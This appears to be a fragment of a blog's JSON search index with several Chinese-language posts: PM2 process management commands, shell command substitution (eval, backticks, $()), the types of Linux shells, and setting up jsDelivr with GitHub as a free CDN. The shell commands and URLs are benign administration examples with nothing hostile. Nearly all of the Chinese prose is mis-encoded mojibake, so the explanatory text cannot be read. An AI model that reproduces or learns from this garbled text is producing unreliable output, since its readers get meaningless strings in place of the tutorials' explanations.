[&#39;all&#39; | app_name | app_id ] 1234$ pm2 logs --json # JSON æ ¼å¼è¾“å‡º$ pm2 logs --format # æ ¼å¼åŒ– output$ pm2 flush # æ¸…ç©ºæ‰€æœ‰æ—¥å¿—æ–‡ä»¶$ pm2 reloadLogs # é‡æ–°åŠ è½½æ‰€æœ‰æ—¥å¿—æ–‡ä»¶ å¸¸ç”¨å‘½ä»¤åœæ­¢è¿›ç¨‹ 1$ pm2 stop [&#39;all&#39; | app_name | app_id ] é‡å¯è¿›ç¨‹ 1$ pm2 restart [&#39;all&#39; | app_name | app_id ] 0ç§’åœæœºé‡è½½è¿›ç¨‹ (ç”¨äº NETWORKED è¿›ç¨‹) 1$ pm2 reload all æ€æ­»è¿›ç¨‹ 1$ pm2 delete [&#39;all&#39; | app_name | app_id ] ä½¿ç”¨PM2 è¿è¡Œ npm startnpm run xxxx æ˜¯ nodeå¸¸ç”¨çš„å¯åŠ¨æ–¹å¼ä¹‹ä¸€ï¼Œé‚£ä¹ˆå¦‚ä½•ä½¿ç”¨PM2æ¥å®ç°å¯¹è¯¥æ–¹å¼çš„å¯åŠ¨å‘¢ï¼Ÿ npm runã€npm startç­‰å‘½ä»¤ä¹‹æ‰€ä»¥å¯ä»¥ä½¿ç”¨ï¼Œæ˜¯å› ä¸ºpackage.jsoné…ç½®æ–‡ä»¶ä¸­å¢åŠ äº†å¯¹åº”çš„è„šæœ¬å‘½ä»¤ã€‚ 1234&quot;scripts&quot;: &#123; &quot;start-dev&quot;: &quot;env $(cat .env | xargs) nodemon server&#x2F;index&quot;, &quot;start&quot;: &quot;node server&#x2F;index&quot;, &#125; è¯­æ³•ï¼š 1pm2 start npm --watch --name &lt;taskname&gt; -- run &lt;scriptname&gt;; å…¶ä¸­ --watchç›‘å¬ä»£ç å˜åŒ–ï¼Œ--nameé‡å‘½åä»»åŠ¡åç§°ï¼Œ-- runåé¢è·Ÿè„šæœ¬åå­— å®ä¾‹ï¼š 12&#x2F;&#x2F; ç­‰æ•ˆäº npm startpm2 start npm --watch --name webserver -- run start ç¨³å®šè¿è¡ŒPM2 æ˜¯ä¸€æ¬¾éå¸¸ä¼˜ç§€çš„ Node è¿›ç¨‹ç®¡ç†å·¥å…·ï¼Œå®ƒæœ‰ç€ä¸°å¯Œçš„ç‰¹æ€§ï¼Œèƒ½å¤Ÿå……åˆ†åˆ©ç”¨å¤šæ ¸CPUä¸”èƒ½å¤Ÿè´Ÿè½½å‡è¡¡ã€èƒ½å¤Ÿå¸®åŠ©åº”ç”¨åœ¨å´©æºƒåã€æŒ‡å®šæ—¶é—´(cluster model)å’Œè¶…å‡ºæœ€å¤§å†…å­˜é™åˆ¶ç­‰æƒ…å†µä¸‹å®ç°è‡ªåŠ¨é‡å¯ã€‚ ä¸ºäº†ä¿è¯èƒ½å¤Ÿç¨³å®šè¿è¡Œï¼Œå¯ä»¥å‚è€ƒä»¥ä¸‹å‡ ç‚¹å»ºè®®ï¼š åº”ç”¨è¿›ç¨‹è¿è¡Œæ—¶é—´ä¹…äº†æˆ–è®¸æ€»ä¼šäº§ç”Ÿä¸€äº›æ„æ–™ä¹‹å¤–çš„é—®é¢˜ï¼Œå®šæ—¶é‡å¯å¯ä»¥è§„é¿ä¸€äº›ä¸å¯æµ‹çš„æƒ…å†µï¼› æœ€å¤§å†…å­˜é™åˆ¶ï¼Œæ ¹æ®è§‚å¯Ÿè®¾å®šåˆç†å†…å­˜é™åˆ¶ï¼Œä¿è¯åº”ç”¨å¼‚å¸¸è¿è¡Œï¼› min_uptimeï¼Œmin_uptime æ˜¯åº”ç”¨æ­£å¸¸å¯åŠ¨çš„æœ€å°æŒç»­è¿è¡Œæ—¶é•¿ï¼Œåˆç†è®¾ç½®è®¾ç½®æ­¤èŒƒå›´ï¼Œå¯ä»¥å°†è¶…å‡ºæ—¶é—´åˆ¤å®šä¸ºå¼‚å¸¸å¯åŠ¨ï¼› è®¾å®šå¼‚å¸¸é‡å¯å»¶æ—¶restart_delayï¼Œå¯¹äºå¼‚å¸¸æƒ…å†µå¯¼è‡´åº”ç”¨åœæ­¢ï¼Œè®¾å®šå¼‚å¸¸é‡å¯å»¶è¿Ÿå¯é˜²æ­¢åº”ç”¨åœ¨ä¸å¯æµ‹æƒ…å†µä¸‹ä¸æ–­é‡å¯çš„å¯¼è‡´é‡å¯æ¬¡æ•°è¿‡å¤šç­‰é—®é¢˜ï¼› è®¾ç½®å¼‚å¸¸é‡å¯æ¬¡æ•°ï¼Œå¦‚æœåº”ç”¨ä¸æ–­å¼‚å¸¸é‡å¯ï¼Œå¹¶è¶…è¿‡ä¸€å®šçš„é™åˆ¶æ¬¡æ•°ï¼Œè¯´æ˜æ­¤æ—¶çš„ç¯å¢ƒé•¿æ—¶é—´å¤„äºä¸å¯æ§çŠ¶æ€ï¼ŒæœåŠ¡å™¨å¼‚å¸¸ã€‚æ­¤æ—¶ä¾¿å¯åœæ­¢å°è¯•ï¼Œå‘å‡ºé”™è¯¯è­¦å‘Šé€šçŸ¥ç­‰ã€‚ å‚è€ƒé“¾æ¥ pm2 ä»å…¥é—¨åˆ°ç²¾é€š å¦‚ä½•åœ¨ç”Ÿäº§æœåŠ¡å™¨ä¸Šå®‰è£…PM2è¿è¡ŒNode.jsåº”ç”¨ç¨‹åº PM2 é…ç½®æ–‡ä»¶è¯´æ˜è§£æ PM2 åº”ç”¨é…ç½®æ–‡ä»¶è§£æ PM2 å®ç”¨æ‰‹å†Œ PM2 ç”¨æ³•è¯¦è§£ ä½¿ç”¨pm2 è‡ªåŠ¨éƒ¨ç½²nodeé¡¹ç›® PM2 ä¸­æ–‡æ–‡æ¡£","categories":[{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/categories/Node/"},{"name":"Tutorial","slug":"Node/Tutorial","permalink":"https://www.0x2beace.com/categories/Node/Tutorial/"},{"name":"è¿›ç¨‹ç®¡ç†","slug":"Node/Tutorial/è¿›ç¨‹ç®¡ç†","permalink":"https://www.0x2beace.com/categories/Node/Tutorial/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/tags/Node/"},{"name":"PM2","slug":"PM2","permalink":"https://www.0x2beace.com/tags/PM2/"},{"name":"è¿›ç¨‹ç®¡ç†","slug":"è¿›ç¨‹ç®¡ç†","permalink":"https://www.0x2beace.com/tags/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"}]},{"title":"Linux ä¸­çš„evalã€åå¼•å·ã€$()çš„åŒºåˆ«","slug":"the-difference-between-eval-and-backquotes-in-linux-and","date":"2020-07-11T12:41:10.000Z","updated":"2020-07-11T12:46:46.350Z","comments":true,"path":"the-difference-between-eval-and-backquotes-in-linux-and/","link":"","permalink":"https://www.0x2beace.com/the-difference-between-eval-and-backquotes-in-linux-and/","excerpt":"ä¹‹å‰åœ¨æ­å»º SSH ç¯å¢ƒæ—¶ï¼Œé‡åˆ°äº†è¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼š ä½¿ç”¨å‘½ä»¤ï¼ševal$(ssh-agent)å»åˆ›å»ºä¸€ä¸ªä»£ç†è¿›ç¨‹ï¼Œä½†æ˜¯ä¼šæç¤ºï¼šNo Such file or directory ã€‚ å°±å¾ˆçº³é—·ï¼Œä¹‹å‰éƒ½ç”¨ç€å¥½å¥½çš„ï¼Œä¸ºä»€ä¹ˆåœ¨æ–°çš„ç¯å¢ƒä¸­å°±ä¸è¡Œäº†ï¼Ÿ åæ¥ï¼Œäº†è§£åˆ°åŸæ¥ä¸€ç›´ä½¿ç”¨çš„ eval$(ssh-agent) ï¼Œå…¶ä¸­çš„$() åŸæ¥åœ¨Linuxä¸­æœ‰ç‰¹æ®Šçš„æ„ä¹‰ã€‚ æ‰€ä»¥è¿™ç¯‡ç¬”è®°ä¸“é—¨ç”¨æ¥äº†è§£ eval å’Œ åå¼•å· ä»¥åŠ $()ä¹‹é—´çš„åŒºåˆ«ã€‚ å®ƒä»¬çš„ä½œç”¨éƒ½æ˜¯å‘½ä»¤æ›¿æ¢ã€‚","text":"ä¹‹å‰åœ¨æ­å»º SSH ç¯å¢ƒæ—¶ï¼Œé‡åˆ°äº†è¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼š ä½¿ç”¨å‘½ä»¤ï¼ševal$(ssh-agent)å»åˆ›å»ºä¸€ä¸ªä»£ç†è¿›ç¨‹ï¼Œä½†æ˜¯ä¼šæç¤ºï¼šNo Such file or directory ã€‚ å°±å¾ˆçº³é—·ï¼Œä¹‹å‰éƒ½ç”¨ç€å¥½å¥½çš„ï¼Œä¸ºä»€ä¹ˆåœ¨æ–°çš„ç¯å¢ƒä¸­å°±ä¸è¡Œäº†ï¼Ÿ åæ¥ï¼Œäº†è§£åˆ°åŸæ¥ä¸€ç›´ä½¿ç”¨çš„ eval$(ssh-agent) ï¼Œå…¶ä¸­çš„$() åŸæ¥åœ¨Linuxä¸­æœ‰ç‰¹æ®Šçš„æ„ä¹‰ã€‚ æ‰€ä»¥è¿™ç¯‡ç¬”è®°ä¸“é—¨ç”¨æ¥äº†è§£ eval å’Œ åå¼•å· ä»¥åŠ $()ä¹‹é—´çš„åŒºåˆ«ã€‚ å®ƒä»¬çš„ä½œç”¨éƒ½æ˜¯å‘½ä»¤æ›¿æ¢ã€‚ åœºæ™¯é‡ç°12345678910$ &#96;ssh-agent&#96;sh.exe&quot;: SSH_AUTH_SOCK&#x3D;&#x2F;tmp&#x2F;ssh-myYvgp1404&#x2F;agent.1404;: No such file or directory$ eval ssh-agentSSH_AUTH_SOCK&#x3D;&#x2F;tmp&#x2F;ssh-zIQZKN6080&#x2F;agent.6080; export SSH_AUTH_SOCK;SSH_AGENT_PID&#x3D;1092; export SSH_AGENT_PID;echo Agent pid 1092;$ eval &#96;ssh-agent&#96;Agent pid 4288 ç›´åˆ°æˆ‘è¾“å…¥ eval ssh-agent æ—¶ï¼Œä¼¼ä¹å°±å¯¹äº†ã€‚ å‘½ä»¤ä»£æ¢è¿™ä¸‰ç§ä¸åŒçš„æ–¹å¼éƒ½æ˜¯shellè„šæœ¬ä¸­çš„å‘½ä»¤ä»£æ¢ã€‚ å‘½ä»¤ä»£æ¢æ˜¯æŒ‡shellèƒ½å¤Ÿå°†ä¸€ä¸ªå‘½ä»¤çš„æ ‡å‡†è¾“å‡ºæ’åœ¨ä¸€ä¸ªå‘½ä»¤è¡Œä¸­ä»»ä½•ä½ç½®ã€‚ evalé¦–å…ˆè¦ä»‹ç»çš„æ˜¯: eval å®ƒçš„ä½œç”¨æ˜¯ï¼šé‡æ–°è¿ç®—æ±‚å‡ºå‚æ•°çš„å†…å®¹ã€‚ è¯¥å‘½ä»¤ä½¿ç”¨äºé‚£äº›ä¸€æ¬¡æ‰«ææ— æ³•å®ç°å…¶åŠŸèƒ½çš„å˜é‡ã€‚è¯¥å‘½ä»¤å¯¹å˜é‡è¿›è¡Œä¸¤æ¬¡æ‰«æã€‚ 1234567891011$ touch test.txt$ vim test.txt &#x2F;&#x2F; å†™å…¥ Hello eval$ var&#x3D;&quot;cat test.txt&quot;&#x2F;&#x2F; æ³¨æ„ï¼šä¸­é—´æ²¡æœ‰ç©ºæ ¼ï¼Œå‰é¢æ²¡æœ‰ç¾å…ƒç¬¦å·ã€‚$ echo $varcat test.txt$ eval $varHello eval åå¼•å·ä¸ $()å®ä¾‹ä¸€ï¼š 12345678910$ DATE1&#x3D;$(date)$ DATE2&#x3D;&#96;date&#96;$ DATE3&#x3D;&#96;eval date&#96;$ echo $DATE12019å¹´01æœˆ23æ—¥ 21:20:36$ echo $DATE22019å¹´01æœˆ23æ—¥ 21:20:36$ echo $DATE32019å¹´01æœˆ23æ—¥ 21:20:36 å®ä¾‹äºŒï¼š 1234$ echo &#96;echo &#39;\\\\&#39;&#96; \\$ echo $(echo &#39;\\\\&#39;)\\\\ æš‚æ—¶æ²¡å¤ªæ˜ç™½è¿™ä¸‰è€…çš„å®é™…åº”ç”¨åœºæ™¯ï¼Œä¸è¿‡äº†è§£åˆ°äº† å®ƒä»¬ä¹‹é—´çš„ä¸€äº›åŒºåˆ«ä¸è”ç³»ã€‚ å‚è€ƒé“¾æ¥ï¼š https://kyle.io/2012/09/ssh-agent-messiness-solving-it/ shellè„šæœ¬ä¸­å‘½ä»¤ä»£æ¢ï¼šåå¼•å·ã€$()ã€evalåŒºåˆ« shellè„šæœ¬ä¸­å‘½ä»¤ä»£æ¢ï¼šåå¼•å·ã€$()ã€evalåŒºåˆ«2","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"å­¦ä¹ ç¬”è®°","slug":"Linux/å­¦ä¹ ç¬”è®°","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"}]},{"title":"Linux ä¸­çš„Shell ç§ç±»","slug":"shell-types-in-linux","date":"2020-07-11T12:36:46.000Z","updated":"2020-07-11T12:41:49.331Z","comments":true,"path":"shell-types-in-linux/","link":"","permalink":"https://www.0x2beace.com/shell-types-in-linux/","excerpt":"ä»€ä¹ˆæ˜¯Shellï¼Ÿ","text":"ä»€ä¹ˆæ˜¯Shellï¼Ÿ Shell æ˜¯ä¸€ä¸ªç¨‹åºï¼Œå…¶ä½œç”¨æ˜¯å°†ç”¨æˆ·è¾“å…¥çš„å‘½ä»¤å‘é€åˆ°OSï¼ˆç³»ç»Ÿå†…æ ¸ï¼‰ã€‚ æ®è¯´å®ƒèµ·æºäºä½œä¸ºå­˜åœ¨äºOS å†…éƒ¨å’Œç”¨æˆ·ä¹‹é—´çš„å¤–å£³çš„ä¾é™„ç€ã€‚æ‰€ä»¥ä¸ºå½¢è±¡çš„ç§°ä½œä¸º å£³ï¼ˆShellï¼‰ã€‚ Shell çš„ç§ç±»Linux Shell çš„ç§ç±»å¾ˆå¤šï¼Œç›®å‰æµè¡Œçš„Shell åŒ…æ‹¬ashã€bashã€kshã€cshã€zshç­‰ï¼Œç§ç±»å¤šäº†ï¼Œä¹Ÿå°±æœ‰äº†æ ‡å‡†åŒ–çš„è¦æ±‚ï¼Œè¿™å°±æ˜¯POSIXçš„ç”±æ¥ã€‚ POSIX è¡¨ç¤ºå¯ç§»æ¤æ“ä½œç³»ç»Ÿæ¥å£ï¼ˆUNIXçš„å¯ç§»æ¤æ“ä½œç³»ç»Ÿæ¥å£ï¼Œç¼©å†™ä¸ºPOSIXï¼‰ï¼ŒPOSIXæ ‡å‡†å®šä¹‰äº†æ“ä½œç³»ç»Ÿåº”è¯¥ä¸ºåº”ç”¨ç¨‹åºæä¾›çš„æ¥å£æ ‡å‡†ã€‚ é€šè¿‡ä»¥ä¸‹å‘½ä»¤æ¥æŸ¥çœ‹æ–‡ä»¶ä¸­çš„å†…å®¹æ¥æŸ¥çœ‹è‡ªå·±ä¸»æœºä¸­å½“å‰æœ‰å“ªäº›ç§ç±»çš„Shellï¼š 1234567891011121314151617$ cat &#x2F;etc&#x2F;shells&#x2F;bin&#x2F;sh&#x2F;bin&#x2F;bash&#x2F;bin&#x2F;ksh&#x2F;bin&#x2F;pdksh&#x2F;bin&#x2F;tcsh&#x2F;bin&#x2F;zsh&#x2F;bin&#x2F;dash&#x2F;bin&#x2F;posh&#x2F;usr&#x2F;bin&#x2F;sh&#x2F;usr&#x2F;bin&#x2F;bash&#x2F;usr&#x2F;bin&#x2F;ksh&#x2F;usr&#x2F;bin&#x2F;pdksh&#x2F;usr&#x2F;bin&#x2F;tcsh&#x2F;usr&#x2F;bin&#x2F;zsh&#x2F;usr&#x2F;bin&#x2F;dash&#x2F;usr&#x2F;bin&#x2F;posh å¦‚ä½•æŸ¥çœ‹å½“å‰æ­£åœ¨ä½¿ç”¨çš„Shell ç±»å‹ï¼š 12$ echo $SHELL&#x2F;bin&#x2F;bash $SHELLæ˜¯ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œå®ƒè®°å½•äº†Linux å½“å‰ç”¨æˆ·æ‰€ä½¿ç”¨çš„Shellç±»å‹ã€‚ ç”¨æˆ·å¯ä»¥é€šè¿‡ç›´æ¥è¾“å…¥å„ç§Shellçš„äºŒè¿›åˆ¶æ–‡ä»¶åï¼ˆå› ä¸ºè¿™äº›äºŒè¿›åˆ¶æ–‡ä»¶æœ¬èº«æ˜¯å¯ä»¥è¢«æ‰§è¡Œçš„ï¼‰ï¼Œæ¥è¿›å…¥åˆ°è¯¥Shellä¸‹ï¼Œæ¯”å¦‚è¿›å…¥zshå¯ä»¥ç›´æ¥è¾“å…¥ï¼š 1$ &#x2F;bin&#x2F;zsh è¿™ä¸ªå‘½ä»¤ä¸ºç”¨æˆ·åˆå¯åŠ¨äº†ä¸€ä¸ªShellï¼Œè¿™ä¸ªShellåœ¨æœ€åˆç™»å½•çš„é‚£ä¸ªShellä¹‹åï¼Œç§°ä¸ºä¸‹çº§çš„Shellæˆ–å­Shellã€‚ æœ€æ ‡å‡†çš„ShellBashshæ˜¯Unix ä¸Šæœ€å¤è€çš„Shellï¼Œåœ¨shçš„åŸºç¡€ä¸Šæ·»åŠ äº†å„ç§æ‰©å±•åŠŸèƒ½çš„æ˜¯bashï¼Œå®ƒæˆä¸ºLinuxæ ‡å‡†Shellã€‚æœ‰å¦‚ä¸‹çš„ç‰¹ç‚¹ï¼š ä½¿ç”¨ä¸Šä¸‹é”®å¿«é€ŸæŸ¥çœ‹å†å²å‘½ä»¤ Tab é”®è‡ªåŠ¨è¡¥å…¨ å…¶ä»–Shellashashæ˜¯Linux ä¸­å ç”¨ç³»ç»Ÿèµ„æºæœ€å°‘çš„ä¸€ä¸ªå°Shellï¼Œå®ƒåªåŒ…å«24ä¸ªå†…éƒ¨å‘½ä»¤ï¼Œå› è€Œä½¿ç”¨èµ·æ¥å¾ˆä¸æ–¹ä¾¿ã€‚ cshcshæ˜¯Linux æ¯”è¾ƒå¤§çš„å†…æ ¸ï¼Œå…±æœ‰52ä¸ªå†…éƒ¨å‘½ä»¤ã€‚è¯¥Shellå…¶å®æ˜¯æŒ‡å‘/bin/tcshè¿™æ ·çš„ä¸€ä¸ªShellï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œcshå…¶å®å°±æ˜¯tcshã€‚ zshzchæ˜¯Linux æœ€å¤§çš„Shellä¹‹ä¸€ï¼Œå…±æœ‰84 ä¸ªå†…éƒ¨å‘½ä»¤ã€‚ zshå…·æœ‰å¦‚ä¸‹ç‰¹æ€§ï¼š æ›´å¥½çš„è‡ªåŠ¨è¡¥å…¨ã€æ›´é«˜æ•ˆ æ›´å¥½çš„æ–‡ä»¶åå±•å¼€ï¼ˆé€šé…ç¬¦å±•å¼€ï¼‰ å¯å®šåˆ¶æ€§é«˜ å‚è€ƒé“¾æ¥ ä»€ä¹ˆæ˜¯Shellä»¥åŠå¸¸è§Shellç§ç±»","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"å­¦ä¹ ç¬”è®°","slug":"Linux/å­¦ä¹ ç¬”è®°","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"}]},{"title":"å…è´¹ CDNï¼šJsDelivr + Github","slug":"free-cdn-jsdelivr-github","date":"2020-07-10T05:32:43.000Z","updated":"2020-07-10T05:34:57.891Z","comments":true,"path":"free-cdn-jsdelivr-github/","link":"","permalink":"https://www.0x2beace.com/free-cdn-jsdelivr-github/","excerpt":"ä¸çŸ¥é“å¤§å®¶é€šå¸¸æ˜¯å¦‚ä½•è®¿é—®å›¾åºŠçš„ï¼Œæˆ‘ä¹‹å‰ä¸€ç›´ä½¿ç”¨çš„æ–¹å¼æ˜¯ï¼šGitHub å›¾åºŠ + raw.githubusercontentã€‚ å›¾ç‰‡ç›¸å…³çš„èµ„æºå…¨éƒ¨æ”¾åœ¨GitHubä¸Šï¼Œç„¶åä½¿ç”¨GitHub æä¾›çš„ç´ ææœåŠ¡å™¨raw.githubusercontentå»è®¿é—®ã€‚ä½†æ˜¯è¿™ç§æ–¹å¼å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯æ”¾åœ¨ Github çš„èµ„æºåœ¨å›½å†…åŠ è½½é€Ÿåº¦æ¯”è¾ƒæ…¢ï¼Œå¦‚æœç½‘ç»œç¨å¾®å·®ä¸€äº›ï¼Œèµ„æºå¯èƒ½å°±ä¼šåŠ è½½å¤±è´¥ã€‚ å› æ­¤éœ€è¦ä½¿ç”¨ CDN æ¥åŠ é€Ÿæ¥ä¼˜åŒ–èµ„æºåŠ è½½é€Ÿåº¦ã€‚","text":"ä¸çŸ¥é“å¤§å®¶é€šå¸¸æ˜¯å¦‚ä½•è®¿é—®å›¾åºŠçš„ï¼Œæˆ‘ä¹‹å‰ä¸€ç›´ä½¿ç”¨çš„æ–¹å¼æ˜¯ï¼šGitHub å›¾åºŠ + raw.githubusercontentã€‚ å›¾ç‰‡ç›¸å…³çš„èµ„æºå…¨éƒ¨æ”¾åœ¨GitHubä¸Šï¼Œç„¶åä½¿ç”¨GitHub æä¾›çš„ç´ ææœåŠ¡å™¨raw.githubusercontentå»è®¿é—®ã€‚ä½†æ˜¯è¿™ç§æ–¹å¼å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯æ”¾åœ¨ Github çš„èµ„æºåœ¨å›½å†…åŠ è½½é€Ÿåº¦æ¯”è¾ƒæ…¢ï¼Œå¦‚æœç½‘ç»œç¨å¾®å·®ä¸€äº›ï¼Œèµ„æºå¯èƒ½å°±ä¼šåŠ è½½å¤±è´¥ã€‚ å› æ­¤éœ€è¦ä½¿ç”¨ CDN æ¥åŠ é€Ÿæ¥ä¼˜åŒ–èµ„æºåŠ è½½é€Ÿåº¦ã€‚ CDN æ˜¯ä»€ä¹ˆ CDNçš„å…¨ç§°æ˜¯Content Delivery Networkï¼Œå³å†…å®¹åˆ†å‘ç½‘ç»œã€‚CDNæ˜¯æ„å»ºåœ¨ç½‘ç»œä¹‹ä¸Šçš„å†…å®¹åˆ†å‘ç½‘ç»œï¼Œä¾é éƒ¨ç½²åœ¨å„åœ°çš„è¾¹ç¼˜æœåŠ¡å™¨ï¼Œé€šè¿‡ä¸­å¿ƒå¹³å°çš„è´Ÿè½½å‡è¡¡ã€å†…å®¹åˆ†å‘ã€è°ƒåº¦ç­‰åŠŸèƒ½æ¨¡å—ï¼Œä½¿ç”¨æˆ·å°±è¿‘è·å–æ‰€éœ€å†…å®¹ï¼Œé™ä½ç½‘ç»œæ‹¥å¡ï¼Œæé«˜ç”¨æˆ·è®¿é—®å“åº”é€Ÿåº¦å’Œå‘½ä¸­ç‡ã€‚CDNçš„å…³é”®æŠ€æœ¯ä¸»è¦æœ‰å†…å®¹å­˜å‚¨å’Œåˆ†å‘æŠ€æœ¯ã€‚â€”â€”ç™¾åº¦ç™¾ç§‘ ç”±äºæŸäº›åŸå› ï¼Œå¾ˆå¤šå…¬ç”¨å…è´¹çš„ CDN èµ„æºåœ¨ä¸­å›½å¤§é™†å¹¶ä¸å¾ˆå¥½ç”¨ï¼Œå°±ç®—æ˜¯ä»˜è´¹çš„ï¼Œä¹Ÿæœ‰ä¸€å®šçš„é™åˆ¶ï¼Œä¾‹å¦‚æ¯å¤©çš„åˆ·æ–°æ¬¡æ•°æœ‰é™ä¹‹ç±»çš„ã€‚å¹¸è¿çš„æ˜¯åœ¨ä¸­å›½å¤§é™†å”¯ä¸€æœ‰ license çš„å…¬æœ‰ CDNç«Ÿç„¶æ˜¯å…è´¹çš„ï¼Œå®ƒå°±æ˜¯â€”â€”JsDelivrã€‚ JsDelivr æ˜¯ä»€ä¹ˆ A free CDN for Open Source fast, reliable, and automated. â€”â€” JsDelivr å®˜ç½‘ æ ¹æ®å®˜ç½‘çš„ä»‹ç»æˆ‘ä»¬å¯ä»¥çŸ¥é“å®ƒæ˜¯ä¸€ä¸ªå…è´¹ã€å¿«é€Ÿã€å¯é ã€è‡ªåŠ¨åŒ– çš„CDNã€‚ é‚£ä¹ˆï¼Œè¿™ä¹ˆæ£’çš„CDNï¼Œåˆ°åº•è¯¥å¦‚ä½•ä½¿ç”¨å‘¢ï¼Ÿä¸‹é¢ä¼šä¸€ä¸€ä»‹ç»ã€‚ å¿«é€Ÿä¸Šæ‰‹JsDelivr ç›®å‰æœ‰ä¸‰ç§ç”¨æ³•ï¼š \u001fNpm Github Wordpress å› ä¸ºæœ¬æ–‡çš„é‡ç‚¹æ˜¯å¦‚ä½•ä½¿ç”¨ GitHub + JsDelivrï¼Œæ¥æ­å»ºå…è´¹çš„CDNï¼Œæ‰€ä»¥è¿™é‡Œå°±ä¸å¯¹å…¶ä»–ä¸¤ç§ç”¨æ³•åšè¿‡å¤šä»‹ç»ã€‚ 1. æ–°å»ºGithub ä»“åº“è¿™ä¸ªä»“åº“æ˜¯ç”¨äºå­˜å‚¨èµ„æºæ–‡ä»¶çš„ï¼Œæœ€å¥½æ˜¯publicï¼Œå› ä¸ºprivateçš„ä»“åº“ï¼Œèµ„æºé“¾æ¥ä¼šå¸¦tokenéªŒè¯ï¼Œè€Œè¿™ä¸ªtokenä¼šå­˜åœ¨è¿‡æœŸçš„é—®é¢˜ã€‚ 2. å°†æœ¬åœ°èµ„æºæ¨é€è‡³ä»“åº“å°†èµ„æºæ–‡ä»¶åŠ å…¥æœ¬åœ°ä»“åº“ï¼Œç„¶åæ¨é€è‡³ CDN çš„è¿œç¨‹ä»“åº“ã€‚ 3. å‘å¸ƒä»“åº“å¦‚æœæ²¡æœ‰å‘å¸ƒå°±ç›´æ¥ä½¿ç”¨ï¼Œå¯èƒ½ä¼šå¯¼è‡´æ–‡ä»¶åŠ è½½å¼‚å¸¸ã€‚ è‡ªå®šä¹‰å‘å¸ƒç‰ˆæœ¬å·ï¼š ç„¶åç‚¹å‡»Publish releaseã€‚ 4. é€šè¿‡jsDeliverå¼•ç”¨èµ„æºåªéœ€è¦é€šè¿‡ç¬¦åˆ JSDelivr è§„åˆ™çš„ URL å¼•ç”¨ï¼Œå³å¯ç›´æ¥ä½¿ç”¨ Github ä¸­çš„èµ„æºã€‚ è§„åˆ™å¦‚ä¸‹ï¼š 1https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;username&#x2F;repository@version&#x2F;file å‚æ•°è¯´æ˜ï¼š cdn.jsdelivr.net/gh/ï¼šjsDeliver è§„å®šGithub çš„å¼•ç”¨åœ°å€ usernameï¼šä½ çš„GitHub ç”¨æˆ·å repositoryï¼šCDN ä»“åº“ @versionï¼šå‘å¸ƒçš„ç‰ˆæœ¬å· fileï¼šèµ„æºæ–‡ä»¶åœ¨ä»“åº“ä¸­çš„è·¯å¾„ ç‰ˆæœ¬å·ä¸æ˜¯å¿…éœ€çš„ï¼Œæ˜¯ä¸ºäº†åŒºåˆ†æ–°æ—§èµ„æºï¼Œå¦‚æœä¸ä½¿ç”¨ç‰ˆæœ¬å·ï¼Œå°†ä¼šç›´æ¥å¼•ç”¨æœ€æ–°èµ„æºï¼Œé™¤æ­¤ä¹‹å¤–è¿˜å¯ä»¥ä½¿ç”¨æŸä¸ªèŒƒå›´å†…çš„ç‰ˆæœ¬ï¼ŒæŸ¥çœ‹æ‰€æœ‰èµ„æºç­‰ï¼Œå…·ä½“ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š 123456789101112131415&#x2F;&#x2F; é€šè¿‡æŒ‡å®šç‰ˆæœ¬å·å¼•ç”¨https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;0xAiKang&#x2F;CDN&#x2F;blog&#x2F;images&#x2F;avatar.jpg&#x2F;&#x2F; ä½¿ç”¨ä¸€ä¸ªèŒƒå›´å†…çš„ç‰ˆæœ¬https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery@3.2.1&#x2F;dist&#x2F;jquery.min.js&#x2F;&#x2F; å¿½ç•¥ç‰ˆæœ¬å·åˆ™é»˜è®¤ä½¿ç”¨æœ€æ–°ç‰ˆhttps:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery&#x2F;dist&#x2F;jquery.min.js&#x2F;&#x2F; åœ¨ä»»æ„JS&#x2F;CSSæ–‡ä»¶åæ·»åŠ  .min èƒ½å¾—åˆ°ä¸€ä¸ªç¼©å°ç‰ˆ&#x2F;&#x2F; å¦‚æœå®ƒæœ¬èº«ä¸å­˜åœ¨ï¼Œæˆ‘ä»¬å°†ä¼šä¸ºä½ ç”Ÿæˆhttps:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery@3.2.1&#x2F;src&#x2F;core.min.js&#x2F;&#x2F; åœ¨æœ«å°¾åŠ  &#x2F; åˆ™å¾—åˆ°ç›®å½•åˆ—è¡¨https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery&#x2F; åŒæ ·çš„ä¸€å¼ å›¾ç‰‡ï¼Œå¯ä»¥å¯¹æ¯”ä¸€ä¸‹jsDeliverå’Œraw.githubusercontent 